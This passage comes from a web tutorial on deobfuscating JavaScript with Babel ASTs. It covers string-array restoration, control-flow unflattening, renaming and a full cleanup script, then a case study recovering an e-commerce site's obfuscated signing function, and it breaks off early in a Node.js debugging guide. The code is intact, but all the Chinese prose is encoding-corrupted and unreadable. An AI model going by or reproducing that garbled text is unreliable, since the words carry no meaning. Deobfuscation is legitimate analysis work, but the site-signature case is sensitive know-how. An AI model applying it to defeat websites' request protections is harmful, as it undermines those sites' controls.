<p><strong>é—®é¢˜</strong>: æ··æ·†å™¨æŠŠæ‰€æœ‰å­—ç¬¦ä¸²æå–åˆ°ä¸€ä¸ªå¤§æ•°ç»„ä¸­</p>
<p><strong>æ··æ·†ä»£ç </strong>:</p>
<pre><code class="language-javascript">const _0x1234 = [&quot;name&quot;, &quot;age&quot;, &quot;hello&quot;];

function greet() {
  console.log(_0x1234[2]); // 'hello'
}
</code></pre>
<p><strong>è§£å†³æ–¹æ¡ˆ</strong>:</p>
<pre><code class="language-javascript">let stringArray = null;

traverse(ast, {
  // ç¬¬ä¸€æ­¥ï¼šæå–å­—ç¬¦ä¸²æ•°ç»„
  VariableDeclarator(path) {
    if (
      path.node.id.name === &quot;_0x1234&quot; &amp;&amp;
      t.isArrayExpression(path.node.init)
    ) {
      stringArray = path.node.init.elements.map((e) =&gt; e.value);
      console.log(&quot;æ‰¾åˆ°å­—ç¬¦ä¸²æ•°ç»„:&quot;, stringArray);
    }
  },
});

traverse(ast, {
  // ç¬¬äºŒæ­¥ï¼šæ›¿æ¢æ‰€æœ‰å¼•ç”¨
  MemberExpression(path) {
    // _0x1234[2] å½¢å¼
    if (
      t.isIdentifier(path.node.object, { name: &quot;_0x1234&quot; }) &amp;&amp;
      t.isNumericLiteral(path.node.property)
    ) {
      const index = path.node.property.value;
      const str = stringArray[index];
      path.replaceWith(t.stringLiteral(str));
    }
  },
});
</code></pre>
<p><strong>åæ··æ·†å</strong>:</p>
<pre><code class="language-javascript">function greet() {
  console.log(&quot;hello&quot;);
}
</code></pre>
<h3>2.4 æ§åˆ¶æµå¹³å¦åŒ–è¿˜åŸ</h3>
<p><strong>é—®é¢˜</strong>: æ··æ·†å™¨æŠŠä»£ç å˜æˆä¸€ä¸ªå¤§çš„ switch-case</p>
<p><strong>æ··æ·†ä»£ç </strong>:</p>
<pre><code class="language-javascript">let _state = 0;
while (true) {
  switch (_state) {
    case 0:
      console.log(&quot;step 1&quot;);
      _state = 1;
      break;
    case 1:
      console.log(&quot;step 2&quot;);
      _state = 2;
      break;
    case 2:
      console.log(&quot;step 3&quot;);
      return;
  }
}
</code></pre>
<p><strong>è§£å†³æ–¹æ¡ˆ</strong>: (å¤æ‚ï¼Œéœ€è¦ç¬¦å·æ‰§è¡Œ)</p>
<pre><code class="language-javascript">// ç®€åŒ–ç‰ˆï¼šæå–é¡ºåºæ‰§è¡Œçš„ case
traverse(ast, {
  WhileStatement(path) {
    const body = path.node.body;

    // æ£€æŸ¥æ˜¯å¦æ˜¯ switch è¯­å¥
    if (t.isSwitchStatement(body.body[0])) {
      const switchNode = body.body[0];
      const cases = switchNode.cases;

      // æŒ‰ case å€¼æ’åº
      const sortedCases = cases.sort((a, b) =&gt; {
        return a.test.value - b.test.value;
      });

      // æå–æ‰€æœ‰ case çš„ bodyï¼ˆå»é™¤ breakï¼‰
      const statements = sortedCases.flatMap((c) =&gt; {
        return c.consequent.filter((s) =&gt; !t.isBreakStatement(s));
      });

      // æ›¿æ¢æ•´ä¸ª while è¯­å¥
      path.replaceWithMultiple(statements);
    }
  },
});
</code></pre>
<h3>2.5 æ ‡è¯†ç¬¦é‡å‘½å</h3>
<p><strong>é—®é¢˜</strong>: æ··æ·†å™¨æŠŠæ‰€æœ‰å˜é‡åæ”¹æˆ <code>_0x1a2b</code>, <code>a</code>, <code>b</code>, <code>c</code></p>
<p><strong>è§£å†³æ–¹æ¡ˆ</strong>: é‡å‘½åä¸ºæœ‰æ„ä¹‰çš„åå­—</p>
<pre><code class="language-javascript">let counter = 0;

traverse(ast, {
  Scope(path) {
    // éå†ä½œç”¨åŸŸä¸­çš„æ‰€æœ‰ç»‘å®š
    Object.keys(path.scope.bindings).forEach((name) =&gt; {
      // å¦‚æœæ˜¯æ··æ·†çš„åå­—ï¼ˆçŸ­æˆ–åå…­è¿›åˆ¶ï¼‰
      if (name.match(/^[a-z]$|^_0x[0-9a-f]+$/i)) {
        const newName = `var_${counter++}`;
        path.scope.rename(name, newName);
      }
    });
  },
});
</code></pre>
<p><strong>ç¤ºä¾‹</strong>:</p>
<pre><code class="language-javascript">// æ··æ·†å‰
function a(b, c) {
  return b + c;
}

// åæ··æ·†å
function var_0(var_1, var_2) {
  return var_1 + var_2;
}
</code></pre>
<hr />
<h2>3. è¿›é˜¶æŠ€å·§</h2>
<h3>3.1 è‡ªå®šä¹‰ Visitor</h3>
<p><strong>Visitor æ¨¡å¼</strong>: Babel ä½¿ç”¨è®¿é—®è€…æ¨¡å¼éå† AST</p>
<pre><code class="language-javascript">const visitor = {
  // è¿›å…¥èŠ‚ç‚¹æ—¶è°ƒç”¨
  enter(path) {
    console.log(&quot;è¿›å…¥:&quot;, path.type);
  },

  // ç¦»å¼€èŠ‚ç‚¹æ—¶è°ƒç”¨
  exit(path) {
    console.log(&quot;ç¦»å¼€:&quot;, path.type);
  },

  // é’ˆå¯¹ç‰¹å®šèŠ‚ç‚¹ç±»å‹
  FunctionDeclaration(path) {
    console.log(&quot;æ‰¾åˆ°å‡½æ•°:&quot;, path.node.id.name);
  },

  // ç®€å†™å½¢å¼ï¼ˆåªæœ‰ enterï¼‰
  CallExpression(path) {
    console.log(&quot;å‡½æ•°è°ƒç”¨:&quot;, path.node.callee.name);
  },
};

traverse(ast, visitor);
</code></pre>
<h3>3.2 Path å¯¹è±¡å¸¸ç”¨æ–¹æ³•</h3>
<table>
<thead>
<tr>
  <th>æ–¹æ³•</th>
  <th>ä½œç”¨</th>
  <th>ç¤ºä¾‹</th>
</tr>
</thead>
<tbody>
<tr>
  <td><code>path.node</code></td>
  <td>è·å–å½“å‰ AST èŠ‚ç‚¹</td>
  <td><code>path.node.id.name</code></td>
</tr>
<tr>
  <td><code>path.parent</code></td>
  <td>è·å–çˆ¶èŠ‚ç‚¹</td>
  <td><code>path.parent</code></td>
</tr>
<tr>
  <td><code>path.scope</code></td>
  <td>è·å–ä½œç”¨åŸŸä¿¡æ¯</td>
  <td><code>path.scope.bindings</code></td>
</tr>
<tr>
  <td><code>path.get('key')</code></td>
  <td>è·å–å­è·¯å¾„</td>
  <td><code>path.get('params.0')</code></td>
</tr>
<tr>
  <td><code>path.replaceWith(node)</code></td>
  <td>æ›¿æ¢èŠ‚ç‚¹</td>
  <td><code>path.replaceWith(t.numericLiteral(123))</code></td>
</tr>
<tr>
  <td><code>path.remove()</code></td>
  <td>åˆ é™¤èŠ‚ç‚¹</td>
  <td><code>path.remove()</code></td>
</tr>
<tr>
  <td><code>path.insertBefore(node)</code></td>
  <td>åœ¨å‰é¢æ’å…¥èŠ‚ç‚¹</td>
  <td><code>path.insertBefore(t.expressionStatement(...))</code></td>
</tr>
<tr>
  <td><code>path.insertAfter(node)</code></td>
  <td>åœ¨åé¢æ’å…¥èŠ‚ç‚¹</td>
  <td><code>path.insertAfter(t.expressionStatement(...))</code></td>
</tr>
<tr>
  <td><code>path.evaluate()</code></td>
  <td>å°è¯•æ±‚å€¼</td>
  <td><code>const result = path.evaluate()</code></td>
</tr>
</tbody>
</table>
<h3>3.3 Scope ä½œç”¨åŸŸåˆ†æ</h3>
<p><strong>æŸ¥æ‰¾å˜é‡ç»‘å®š</strong>:</p>
<pre><code class="language-javascript">traverse(ast, {
  FunctionDeclaration(path) {
    const funcName = path.node.id.name;

    // è·å–å‡½æ•°ä½œç”¨åŸŸ
    const scope = path.scope;

    // æŸ¥æ‰¾å˜é‡ç»‘å®š
    const binding = scope.getBinding(&quot;someVariable&quot;);

    if (binding) {
      console.log(&quot;å˜é‡å®šä¹‰äº:&quot;, binding.path.node.loc);
      console.log(&quot;å¼•ç”¨æ¬¡æ•°:&quot;, binding.references);
      console.log(&quot;æ˜¯å¦è¢«å¼•ç”¨:&quot;, binding.referenced);
    }
  },
});
</code></pre>
<p><strong>é‡å‘½åå˜é‡ï¼ˆåŒ…æ‹¬æ‰€æœ‰å¼•ç”¨ï¼‰</strong>:</p>
<pre><code class="language-javascript">traverse(ast, {
  Identifier(path) {
    if (path.node.name === &quot;oldName&quot;) {
      path.scope.rename(&quot;oldName&quot;, &quot;newName&quot;);
    }
  },
});
</code></pre>
<h3>3.4 ç±»å‹æ£€æŸ¥ä¸åˆ›å»º</h3>
<p><strong>æ£€æŸ¥èŠ‚ç‚¹ç±»å‹</strong>:</p>
<pre><code class="language-javascript">if (t.isIdentifier(node)) {
  console.log(&quot;è¿™æ˜¯ä¸€ä¸ªæ ‡è¯†ç¬¦&quot;);
}

if (t.isIdentifier(node, { name: &quot;foo&quot; })) {
  console.log(&quot;è¿™æ˜¯åä¸º foo çš„æ ‡è¯†ç¬¦&quot;);
}

if (t.isFunctionDeclaration(node)) {
  console.log(&quot;è¿™æ˜¯ä¸€ä¸ªå‡½æ•°å£°æ˜&quot;);
}
</code></pre>
<p><strong>åˆ›å»ºæ–°èŠ‚ç‚¹</strong>:</p>
<pre><code class="language-javascript">// åˆ›å»ºæ•°å­—å­—é¢é‡
const num = t.numericLiteral(123);

// åˆ›å»ºå­—ç¬¦ä¸²å­—é¢é‡
const str = t.stringLiteral(&quot;hello&quot;);

// åˆ›å»ºæ ‡è¯†ç¬¦
const id = t.identifier(&quot;myVar&quot;);

// åˆ›å»ºå‡½æ•°è°ƒç”¨
const call = t.callExpression(t.identifier(&quot;console.log&quot;), [
  t.stringLiteral(&quot;hello&quot;),
]);

// åˆ›å»ºå˜é‡å£°æ˜
const varDecl = t.variableDeclaration(&quot;const&quot;, [
  t.variableDeclarator(t.identifier(&quot;x&quot;), t.numericLiteral(10)),
]);
</code></pre>
<hr />
<h2>4. å®Œæ•´åæ··æ·†è„šæœ¬ç¤ºä¾‹</h2>
<h3>4.1 é’ˆå¯¹ javascript-obfuscator</h3>
<pre><code class="language-javascript">const parser = require(&quot;@babel/parser&quot;);
const traverse = require(&quot;@babel/traverse&quot;).default;
const generator = require(&quot;@babel/generator&quot;).default;
const t = require(&quot;@babel/types&quot;);
const fs = require(&quot;fs&quot;);

// è¯»å–æ··æ·†ä»£ç 
const code = fs.readFileSync(&quot;obfuscated.js&quot;, &quot;utf-8&quot;);
const ast = parser.parse(code);

// ========== æ­¥éª¤ 1: å¸¸é‡æŠ˜å  ==========
traverse(ast, {
  BinaryExpression(path) {
    const result = path.evaluate();
    if (result.confident) {
      path.replaceWith(t.valueToNode(result.value));
    }
  },
});

// ========== æ­¥éª¤ 2: å­—ç¬¦ä¸²æ•°ç»„è¿˜åŸ ==========
let stringArray = null;

// æå–å­—ç¬¦ä¸²æ•°ç»„
traverse(ast, {
  VariableDeclarator(path) {
    if (
      t.isArrayExpression(path.node.init) &amp;&amp;
      path.node.init.elements.every((e) =&gt; t.isStringLiteral(e))
    ) {
      stringArray = path.node.init.elements.map((e) =&gt; e.value);
      console.log(`[å­—ç¬¦ä¸²æ•°ç»„] æ‰¾åˆ° ${stringArray.length} ä¸ªå­—ç¬¦ä¸²`);

      // è®°å½•æ•°ç»„å
      const arrayName = path.node.id.name;

      // æ›¿æ¢æ‰€æœ‰å¼•ç”¨
      path.scope.traverse(path.scope.block, {
        MemberExpression(innerPath) {
          if (
            t.isIdentifier(innerPath.node.object, { name: arrayName }) &amp;&amp;
            t.isNumericLiteral(innerPath.node.property)
          ) {
            const index = innerPath.node.property.value;
            if (index &lt; stringArray.length) {
              innerPath.replaceWith(t.stringLiteral(stringArray[index]));
            }
          }
        },
      });

      // åˆ é™¤æ•°ç»„å®šä¹‰
      path.remove();
    }
  },
});

// ========== æ­¥éª¤ 3: æ­»ä»£ç æ¶ˆé™¤ ==========
traverse(ast, {
  IfStatement(path) {
    const test = path.get(&quot;test&quot;).evaluate();
    if (test.confident) {
      if (test.value) {
        path.replaceWithMultiple(path.node.consequent.body);
      } else {
        if (path.node.alternate) {
          path.replaceWithMultiple(path.node.alternate.body);
        } else {
          path.remove();
        }
      }
    }
  },
});

// ========== æ­¥éª¤ 4: åˆ é™¤æœªä½¿ç”¨çš„å˜é‡ ==========
traverse(ast, {
  VariableDeclarator(path) {
    const binding = path.scope.getBinding(path.node.id.name);
    if (binding &amp;&amp; !binding.referenced) {
      console.log(`[åˆ é™¤] æœªä½¿ç”¨çš„å˜é‡: ${path.node.id.name}`);
      path.remove();
    }
  },
});

// ========== æ­¥éª¤ 5: å‡½æ•°è°ƒç”¨å†…è” (ç®€å•æƒ…å†µ) ==========
traverse(ast, {
  CallExpression(path) {
    // å¦‚æœè°ƒç”¨çš„æ˜¯ IIFEï¼ˆç«‹å³æ‰§è¡Œå‡½æ•°ï¼‰
    if (
      t.isFunctionExpression(path.node.callee) &amp;&amp;
      path.node.callee.params.length === 0
    ) {
      // æ›¿æ¢ä¸ºå‡½æ•°ä½“
      const body = path.node.callee.body.body;
      if (body.length === 1 &amp;&amp; t.isReturnStatement(body[0])) {
        path.replaceWith(body[0].argument);
      }
    }
  },
});

// ç”Ÿæˆä»£ç 
const output = generator(ast, {
  jsescOption: { minimal: true },
  compact: false, // ä¸å‹ç¼©
  comments: false, // å»é™¤æ³¨é‡Š
});

fs.writeFileSync(&quot;deobfuscated.js&quot;, output.code);
console.log(&quot;\nåæ··æ·†å®Œæˆï¼è¾“å‡ºæ–‡ä»¶: deobfuscated.js&quot;);
console.log(`æºä»£ç : ${code.length} å­—ç¬¦`);
console.log(`åæ··æ·†å: ${output.code.length} å­—ç¬¦`);
</code></pre>
<h3>4.2 æ€§èƒ½ä¼˜åŒ–</h3>
<p><strong>é—®é¢˜</strong>: AST éå†å¾ˆæ…¢ï¼Œå°¤å…¶æ˜¯å¤§æ–‡ä»¶</p>
<p><strong>è§£å†³æ–¹æ¡ˆ 1: å•æ¬¡éå†</strong></p>
<pre><code class="language-javascript">// âŒ æ…¢ï¼ˆå¤šæ¬¡éå†ï¼‰
traverse(ast, { BinaryExpression() {} });
traverse(ast, { IfStatement() {} });
traverse(ast, { CallExpression() {} });

// âœ… å¿«ï¼ˆå•æ¬¡éå†ï¼‰
traverse(ast, {
  BinaryExpression() {},
  IfStatement() {},
  CallExpression() {},
});
</code></pre>
<p><strong>è§£å†³æ–¹æ¡ˆ 2: æå‰é€€å‡º</strong></p>
<pre><code class="language-javascript">traverse(ast, {
  FunctionDeclaration(path) {
    if (path.node.id.name === &quot;targetFunction&quot;) {
      // æ‰¾åˆ°ç›®æ ‡å‡½æ•°ï¼Œåœæ­¢éå†
      path.stop();
    }
  },
});
</code></pre>
<p><strong>è§£å†³æ–¹æ¡ˆ 3: é™åˆ¶éå†æ·±åº¦</strong></p>
<pre><code class="language-javascript">traverse(ast, {
  enter(path) {
    // åªéå†ç¬¬ä¸€å±‚
    if (path.node.loc.start.line &gt; 100) {
      path.skip(); // è·³è¿‡å­èŠ‚ç‚¹
    }
  },
});
</code></pre>
<hr />
<h2>5. AST Explorer (åœ¨çº¿å·¥å…·)</h2>
<p><strong>ç½‘å€</strong>: <a href="https://astexplorer.net/">https://astexplorer.net/</a></p>
<p><strong>åŠŸèƒ½</strong>:</p>
<ul>
<li>å®æ—¶æŸ¥çœ‹ä»£ç çš„ AST ç»“æ„</li>
<li>æ”¯æŒå¤šç§è¯­è¨€ï¼ˆJavaScript, TypeScript, JSX, etc.ï¼‰</li>
<li>æ”¯æŒå¤šç§è§£æå™¨ï¼ˆBabel, Acorn, Esprima, etc.ï¼‰</li>
<li>å®æ—¶ç¼–å†™å’Œæµ‹è¯•è½¬æ¢æ’ä»¶</li>
</ul>
<p><strong>ä½¿ç”¨æ­¥éª¤</strong>:</p>
<ol>
<li>è®¿é—® astexplorer.net</li>
<li>å·¦ä¾§è¾“å…¥ JavaScript ä»£ç </li>
<li>å³ä¾§è‡ªåŠ¨æ˜¾ç¤º AST ç»“æ„</li>
<li>ç‚¹å‡»èŠ‚ç‚¹æŸ¥çœ‹è¯¦ç»†ä¿¡æ¯</li>
<li>åœ¨ Transform æ ‡ç­¾é¡µç¼–å†™ Babel æ’ä»¶æµ‹è¯•</li>
</ol>
<p><strong>ç¤ºä¾‹</strong>:</p>
<p>è¾“å…¥:</p>
<pre><code class="language-javascript">const x = 1 + 2;
</code></pre>
<p>AST è¾“å‡ºï¼ˆç®€åŒ–ï¼‰:</p>
<pre><code class="language-json">{
  &quot;type&quot;: &quot;VariableDeclaration&quot;,
  &quot;declarations&quot;: [
    {
      &quot;type&quot;: &quot;VariableDeclarator&quot;,
      &quot;id&quot;: { &quot;type&quot;: &quot;Identifier&quot;, &quot;name&quot;: &quot;x&quot; },
      &quot;init&quot;: {
        &quot;type&quot;: &quot;BinaryExpression&quot;,
        &quot;operator&quot;: &quot;+&quot;,
        &quot;left&quot;: { &quot;type&quot;: &quot;NumericLiteral&quot;, &quot;value&quot;: 1 },
        &quot;right&quot;: { &quot;type&quot;: &quot;NumericLiteral&quot;, &quot;value&quot;: 2 }
      }
    }
  ]
}
</code></pre>
<hr />
<h2>6. å®æˆ˜æ¡ˆä¾‹</h2>
<h3>æ¡ˆä¾‹ 1ï¼šæŸç”µå•†ç½‘ç«™çš„ç­¾åç®—æ³•</h3>
<p><strong>ç›®æ ‡</strong>: è¿˜åŸæ··æ·†çš„ç­¾åå‡½æ•°</p>
<p><strong>æ··æ·†ä»£ç </strong> (ç®€åŒ–ç‰ˆ):</p>
<pre><code class="language-javascript">const _0x1234 = [&quot;sign&quot;, &quot;md5&quot;, &quot;timestamp&quot;];

function _0xabcd(a, b) {
  return _0x1234[0] + a + _0x1234[2] + b;
}
</code></pre>
<p><strong>åæ··æ·†è„šæœ¬</strong>:</p>
<pre><code class="language-javascript">// (ä½¿ç”¨å‰é¢çš„å®Œæ•´è„šæœ¬)
</code></pre>
<p><strong>åæ··æ·†å</strong>:</p>
<pre><code class="language-javascript">function _0xabcd(a, b) {
  return &quot;sign&quot; + a + &quot;timestamp&quot; + b;
}
</code></pre>
<p><strong>æ‰‹åŠ¨ç®€åŒ–</strong>:</p>
<pre><code class="language-javascript">function generateSignString(user_id, timestamp) {
  return &quot;sign&quot; + user_id + &quot;timestamp&quot; + timestamp;
}
</code></pre>
<h3>æ¡ˆä¾‹ 2ï¼šæ§åˆ¶æµå¹³å¦åŒ–è¿˜åŸ</h3>
<p><strong>æ··æ·†ä»£ç </strong>:</p>
<pre><code class="language-javascript">let _state = &quot;init&quot;;
while (_state !== &quot;end&quot;) {
  switch (_state) {
    case &quot;init&quot;:
      console.log(&quot;Start&quot;);
      _state = &quot;middle&quot;;
      break;
    case &quot;middle&quot;:
      console.log(&quot;Process&quot;);
      _state = &quot;end&quot;;
      break;
  }
}
</code></pre>
<p><strong>åæ··æ·†è„šæœ¬</strong>: (ä½¿ç”¨å‰é¢çš„æ§åˆ¶æµå¹³å¦åŒ–è¿˜åŸä»£ç )</p>
<p><strong>åæ··æ·†å</strong>:</p>
<pre><code class="language-javascript">console.log(&quot;Start&quot;);
console.log(&quot;Process&quot;);
</code></pre>
<hr />
<h2>7. å¸¸è§ AST èŠ‚ç‚¹ç±»å‹</h2>
<table>
<thead>
<tr>
  <th>ç±»å‹</th>
  <th>è¯´æ˜</th>
  <th>ç¤ºä¾‹ä»£ç </th>
</tr>
</thead>
<tbody>
<tr>
  <td><strong>Program</strong></td>
  <td>æ•´ä¸ªç¨‹åº</td>
  <td><code>æ•´ä¸ª JS æ–‡ä»¶</code></td>
</tr>
<tr>
  <td><strong>FunctionDeclaration</strong></td>
  <td>å‡½æ•°å£°æ˜</td>
  <td><code>function foo() {}</code></td>
</tr>
<tr>
  <td><strong>VariableDeclaration</strong></td>
  <td>å˜é‡å£°æ˜</td>
  <td><code>const x = 1;</code></td>
</tr>
<tr>
  <td><strong>ExpressionStatement</strong></td>
  <td>è¡¨è¾¾å¼è¯­å¥</td>
  <td><code>console.log();</code></td>
</tr>
<tr>
  <td><strong>CallExpression</strong></td>
  <td>å‡½æ•°è°ƒç”¨</td>
  <td><code>foo()</code></td>
</tr>
<tr>
  <td><strong>BinaryExpression</strong></td>
  <td>äºŒå…ƒè¡¨è¾¾å¼</td>
  <td><code>1 + 2</code></td>
</tr>
<tr>
  <td><strong>Identifier</strong></td>
  <td>æ ‡è¯†ç¬¦</td>
  <td><code>foo</code>, <code>x</code></td>
</tr>
<tr>
  <td><strong>NumericLiteral</strong></td>
  <td>æ•°å­—å­—é¢é‡</td>
  <td><code>123</code></td>
</tr>
<tr>
  <td><strong>StringLiteral</strong></td>
  <td>å­—ç¬¦ä¸²å­—é¢é‡</td>
  <td><code>'hello'</code></td>
</tr>
<tr>
  <td><strong>ArrayExpression</strong></td>
  <td>æ•°ç»„è¡¨è¾¾å¼</td>
  <td><code>[1, 2, 3]</code></td>
</tr>
<tr>
  <td><strong>ObjectExpression</strong></td>
  <td>å¯¹è±¡è¡¨è¾¾å¼</td>
  <td><code>{a: 1, b: 2}</code></td>
</tr>
<tr>
  <td><strong>MemberExpression</strong></td>
  <td>æˆå‘˜è®¿é—®</td>
  <td><code>obj.prop</code>, <code>arr[0]</code></td>
</tr>
<tr>
  <td><strong>IfStatement</strong></td>
  <td>if è¯­å¥</td>
  <td><code>if (x) {...}</code></td>
</tr>
<tr>
  <td><strong>WhileStatement</strong></td>
  <td>while å¾ªç¯</td>
  <td><code>while (true) {...}</code></td>
</tr>
<tr>
  <td><strong>ForStatement</strong></td>
  <td>for å¾ªç¯</td>
  <td><code>for (;;) {...}</code></td>
</tr>
<tr>
  <td><strong>ReturnStatement</strong></td>
  <td>return è¯­å¥</td>
  <td><code>return x;</code></td>
</tr>
</tbody>
</table>
<hr />
<h2>8. å·¥å…·ä¸èµ„æº</h2>
<table>
<thead>
<tr>
  <th>èµ„æº</th>
  <th>ç±»å‹</th>
  <th>é“¾æ¥</th>
</tr>
</thead>
<tbody>
<tr>
  <td><strong>AST Explorer</strong></td>
  <td>åœ¨çº¿å·¥å…·</td>
  <td>https://astexplorer.net/</td>
</tr>
<tr>
  <td><strong>Babel æ–‡æ¡£</strong></td>
  <td>å®˜æ–¹æ–‡æ¡£</td>
  <td>https://babeljs.io/docs/</td>
</tr>
<tr>
  <td><strong>Babel Handbook</strong></td>
  <td>æ·±åº¦æ•™ç¨‹</td>
  <td>https://github.com/jamiebuilds/babel-handbook</td>
</tr>
<tr>
  <td><strong>jsjiami è¿˜åŸ</strong></td>
  <td>å¼€æºå·¥å…·</td>
  <td>GitHub: javascript-obfuscator-deobfuscator</td>
</tr>
<tr>
  <td><strong>webcrack</strong></td>
  <td>Webpack åæ‰“åŒ…</td>
  <td>https://github.com/j4k0xb/webcrack</td>
</tr>
<tr>
  <td><strong>de4js</strong></td>
  <td>åœ¨çº¿åæ··æ·†</td>
  <td>https://lelinhtinh.github.io/de4js/</td>
</tr>
</tbody>
</table>
<hr />
<h2>æ€»ç»“</h2>
<p>AST æ˜¯å¯¹æŠ—é«˜é˜¶æ··æ·†çš„ç»ˆææ‰‹æ®µã€‚æŒæ¡ä»¥ä¸‹æŠ€èƒ½ï¼š</p>
<ol>
<li>âœ… <strong>Babel å·¥ä½œæµ</strong>: parse â†’ traverse â†’ generate</li>
<li>âœ… <strong>å¸¸ç”¨è½¬æ¢</strong>: å¸¸é‡æŠ˜å ã€æ­»ä»£ç æ¶ˆé™¤ã€å­—ç¬¦ä¸²æ•°ç»„è¿˜åŸ</li>
<li>âœ… <strong>Visitor æ¨¡å¼</strong>: ç†è§£å¦‚ä½•éå†å’Œä¿®æ”¹ AST</li>
<li>âœ… <strong>Path å’Œ Scope</strong>: æŒæ¡è·¯å¾„æ“ä½œå’Œä½œç”¨åŸŸåˆ†æ</li>
<li>âœ… <strong>ç±»å‹ç³»ç»Ÿ</strong>: ä½¿ç”¨ @babel/types åˆ›å»ºå’Œæ£€æŸ¥èŠ‚ç‚¹</li>
<li>âœ… <strong>æ€§èƒ½ä¼˜åŒ–</strong>: å•æ¬¡éå†ã€æå‰é€€å‡ºã€é™åˆ¶æ·±åº¦</li>
</ol>
<p><strong>è®°ä½</strong>: AST è™½ç„¶å­¦ä¹ æ›²çº¿é™¡å³­ï¼Œä½†ä¸€æ—¦æŒæ¡ï¼Œä½ å°±èƒ½åƒå¤–ç§‘æ‰‹æœ¯ä¸€æ ·ç²¾ç¡®åœ°å‰”é™¤ä»£ç ä¸­çš„&quot;æ¯’ç˜¤&quot;ã€‚</p>
<hr />
<h2>ç›¸å…³ç« èŠ‚</h2>
<ul>
<li><a href="#section-32">JavaScript åæ··æ·†</a></li>
<li><a href="#section-30">åŠ¨æ€å‚æ•°åˆ†æ</a></li>
<li><a href="#section-23">Node.js è°ƒè¯•æŒ‡å—</a></li>
<li><a href="#section-15">æµè§ˆå™¨å¼€å‘è€…å·¥å…·</a></li>
</ul>

                                            </div>
                                            
                                            <div class="section" id="section-23">
                                                <h2>[R22] Node.js Debugging</h2>
                                                <h1>R22: Node.js è°ƒè¯•æŒ‡å—</h1>
<h2>æ¦‚è¿°</h2>
<p>éšç€ Webpackã€Vite ç­‰æ„å»ºå·¥å…·çš„æ™®åŠï¼Œå‰ç«¯ä»£ç çš„æ··æ·†å’Œæ‰“åŒ…é€»è¾‘å¾€å¾€è¿è¡Œåœ¨ Node.js ç¯å¢ƒä¸­ã€‚é€†å‘å·¥ç¨‹ä¸­ï¼Œæˆ‘ä»¬ç»å¸¸éœ€è¦è°ƒè¯• Webpack çš„ Loader/Pluginã€åˆ†ææœåŠ¡ç«¯çš„ JS é€»è¾‘ã€æˆ–è€…ç†è§£åŠ å¯†ç®—æ³•çš„å®ç°ã€‚</p>
<p>Node.js è°ƒè¯•çš„æ ¸å¿ƒæ˜¯åˆ©ç”¨ Chrome DevTools Protocol (CDP) æä¾›çš„å¼ºå¤§è°ƒè¯•èƒ½åŠ›ã€‚</p>
<hr />
<h2>1. åŸºç¡€è°ƒè¯• (--inspect-brk)</h2>
<h3>1.1 å¯åŠ¨è°ƒè¯•æ¨¡å¼</h3>
<p><strong>æœ€é€šç”¨çš„ Node.js è°ƒè¯•æ–¹æ³•</strong>ï¼š</p>
<pre><code class="language-bash"># --inspect: å¯åŠ¨è°ƒè¯•ï¼Œä½†ä¸æš‚åœ
node --inspect script.js

# --inspect-brk: å¯åŠ¨è°ƒè¯•å¹¶åœ¨ç¬¬ä¸€è¡Œæš‚åœï¼ˆæ¨èï¼‰
node --inspect-brk script.js

# æŒ‡å®šè°ƒè¯•ç«¯å£ï¼ˆé»˜è®¤ 9229ï¼‰
node --inspect-brk=5858 script.js

# ç»‘å®šåˆ°æ‰€æœ‰ç½‘ç»œæ¥å£ï¼ˆå…è®¸è¿œç¨‹è°ƒè¯•ï¼‰
node --inspect-brk=0.0.0.0:9229 script.js
</code></pre>
<h3>1.2 è¿æ¥ Chrome DevTools</h3>
<p><strong>æ–¹æ³• 1: chrome://inspect</strong></p>
<ol>
<li>å¯åŠ¨è°ƒè¯•æ¨¡å¼åï¼Œç»ˆç«¯æ˜¾ç¤ºï¼š<pre><code>Debugger listening on ws://127.0.0.1:9229/unique-id
</code></pre>
</li>
<li>æ‰“å¼€ Chrome æµè§ˆå™¨ï¼Œè®¿é—® <code>chrome://inspect</code></li>
<li>åœ¨ &quot;Remote Target&quot; ä¸‹ç‚¹å‡» &quot;inspect&quot; æŒ‰é’®</li>
<li>è‡ªåŠ¨æ‰“å¼€ DevToolsï¼Œå¯ä»¥åƒè°ƒè¯•ç½‘é¡µä¸€æ ·è°ƒè¯• Node.js</li>
</ol>
<p><strong>æ–¹æ³• 2: DevTools URL</strong></p>
<pre><code>chrome-devtools://devtools/bundled/js_app.html?ws=127.0.0.1:9229/unique-id
</code></pre>
<p><strong>æ–¹æ³• 3: è‡ªåŠ¨å‘ç°</strong></p>
<ul>
<li>Settings â†’ Discover network targets</li>
<li>æ·»åŠ  <code>localhost:9229</code></li>
</ul>
<h3>1.3 è°ƒè¯•ç¤ºä¾‹</h3>
<p><strong>è„šæœ¬</strong>: encrypt.js</p>
<pre><code class="language-javascript">const crypto = require(&quot;crypto&quot;);

function encrypt(text, key) {
  const cipher = crypto.createCipheriv(&quot;aes-128-cbc&quot;, key, Buffer.alloc(16));
  let encrypted = cipher.update(text, &quot;utf8&quot;, &quot;hex&quot;);
  encrypted += cipher.final(&quot;hex&quot;);
  return encrypted;
}

const key = Buffer.from(&quot;1234567890abcdef&quot;);
const result = encrypt(&quot;Hello World&quot;, key);
console.log(&quot;åŠ å¯†ç»“æœ:&quot;, result);
</code></pre>
<p><strong>è°ƒè¯•</strong>:</p>
<pre><code class="language-bash">node --inspect-brk encrypt.js
</code></pre>
<p>åœ¨ DevTools ä¸­ï¼š</p>
<ol>
<li>è‡ªåŠ¨åœåœ¨ç¬¬ä¸€è¡Œ</li>
<li>åœ¨ <code>encrypt</code> å‡½æ•°æ‰“æ–­ç‚¹</li>
<li>F8 ç»§ç»­æ‰§è¡Œ â†’ æ–­åœ¨ <code>encrypt</code> å‡½æ•°</li>
<li>æŸ¥çœ‹ Scope é¢æ¿ä¸­çš„ <code>text</code>, <code>key</code> å˜é‡</li>
</ol>
<hr />
<h2>2. åœ¨ VSCode ä¸­è°ƒè¯•</h2>
<h3>2.1 JavaScript Debug Terminal</h3>
<p><strong>æœ€ç®€å•çš„æ–¹æ³•</strong>ï¼ˆæ— éœ€é…ç½®ï¼‰ï¼š</p>
<ol>
<li>æ‰“å¼€ VSCode</li>
<li>ç‚¹å‡»ä¾§è¾¹æ  &quot;Run and Debug&quot; (Ctrl+Shift+D)</li>
<li>ç‚¹å‡» &quot;JavaScript Debug Terminal&quot;</li>
<li>åœ¨ç»ˆç«¯ä¸­è¿è¡Œï¼š<pre><code class="language-bash">node script.js
</code></pre>
</li>
<li>VSCode è‡ªåŠ¨ Attach å¹¶åœåœ¨ä½ æ‰“çš„æ–­ç‚¹ä¸Š</li>
</ol>
<h3>2.2 launch.json é…ç½®</h3>
